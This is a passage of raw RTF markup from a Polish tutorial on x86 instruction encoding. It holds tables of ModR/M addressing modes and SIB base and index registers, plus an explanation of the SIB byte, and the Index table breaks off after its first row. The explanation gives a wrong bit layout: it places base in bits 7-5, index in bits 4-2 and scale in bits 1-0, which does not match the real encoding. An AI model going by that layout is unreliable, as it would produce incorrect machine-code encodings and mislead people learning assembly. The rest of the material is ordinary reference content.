\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[ECX]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[ECX+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[ECX+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EDX]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EDX+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EDX+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EBX]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EBX+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EBX+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[SIB]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[SIB+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[SIB+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS/SS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS:[O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS:[EBP+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS:[EBP+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[ESI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[ESI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[ESI+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EDI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EDI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EDI+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}\row}{\*\abiendtable}
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch U\uc1\u380\'bfyty w tabeli skr\'f3t SIB (ang. Scale Index Base) oznacza rozszerzony spos\'f3b adresowania, w kt\'f3rym u\uc1\u322\'b3atwiony jest m.in. dost\uc1\u281\'eap do tablic. Bajt opisuj\uc1\u261\'b9cy pola SIB wyst\uc1\u281\'eapuje zaraz po bajcie MmRejMem. Spos\'f3b obliczania przez procesor adresu zawartego w SIB jest nast\uc1\u281\'eapuj\uc1\u261\'b9cy:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Adres SIB:=Baza+Indeks*(2^N), gdzie}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > baza opisywana jest przez bity 7-5 bajtu SIB;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > indeks opisywany jest przez bity 4-2 bajtu SIB;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > liczba N opisyw}{\f0\fs24\lang1045{\*\listtag0}ana przez bity 1-0 bajtu SIB (tak wi\uc1\u281\'eac jedyna mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 to mno\uc1\u380\'bfenie indeksu przez 2^00=1, 2^01=2, 2^10=4 2^11=8).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfsza tabela zawiera warto\uc1\u347\'9cci, kt\'f3re mo\uc1\u380\'bfe przyjmowa\uc1\u263\'e6 Baza.}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.6362in/1.6369in/1.6369in/1.6369in/; table-sdh:89edc38}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Baza}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Seg/Mm}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01,10,11}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f3\fs20\lang1045{\*\listtag0}  }{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EAX}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EAX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ECX}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ECX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EBX}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EBX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDX}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ESP}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ESP}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS/SS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS:O32}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS:EBP}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ESI}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ESI}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2300\clvertalt\cltxlrtb    \cellx4657\clvertalt\cltxlrtb    \cellx7014\clvertalt\cltxlrtb    \cellx9371
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDI}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDI}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfsza tabela zawiera warto\uc1\u347\'9cci, kt\'f3re mo\uc1\u380\'bfe przyjmowa\uc1\u263\'e6 Indeks.}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:3.2939in/3.2946in/; table-sdh:89ef510}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Index}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Rejestr}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EAX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
